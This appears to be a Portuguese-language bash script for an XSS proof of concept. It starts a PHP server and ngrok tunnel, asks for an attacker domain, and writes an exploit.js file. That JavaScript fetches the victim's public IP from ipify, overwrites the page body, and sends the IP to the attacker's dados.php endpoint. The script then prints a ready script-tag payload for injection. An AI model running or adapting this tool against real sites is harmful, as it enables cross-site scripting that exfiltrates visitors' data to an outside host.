#!/bin/bash

function banner {
    cat banner.txt;
    sleep 1;
    echo -e "\033[33;1mPOC XSS - By: Ismael Oliveira\033[m";
}

banner;

ngrok=$(zenity --forms    \
        --title="Formulário"    \
        --text="Você vai utilizar PHP Server + NGRROK? [s/n]" \
        --add-entry="Dominio" \
        --separator="," \
        --ok-label="Hackear"
);

function remove {
        if [ -e exploit.js ];then
                echo "Apgando antigo exploit.js...";
                rm exploit.js;
        fi
}

case $ngrok in
	's')
		terminator -e "php -S localhost:80 " &
		terminator -e "ngrok http 80 " &
		remove;;
	'n')
		echo "Neste caso, configure seu servidor web com o arquivo PHP e JS";
		remove;;
        *)
		echo -e "\033[31;1mOpção Inválida!\033[m";
		exit;;
esac	

dominioHack=$(zenity --forms    \
        --title="Formulário"    \
        --text="Formulário Hacking" \
        --add-entry="Dominio" \
        --separator="," \
        --ok-label="Hackear"
);


clear;
banner;


echo -e "fetch('https://api.ipify.org/?format=json') .then(function(response){ return response.json();}) .then(function(data) { document.body.innerHTML='POC - IP Info: '+data.ip; fetch('"$dominioHack"/dados.php?ip='+data.ip)}); " >> exploit.js;




echo "Payload: <script src='"$dominioHack"/exploit.js'></script>"

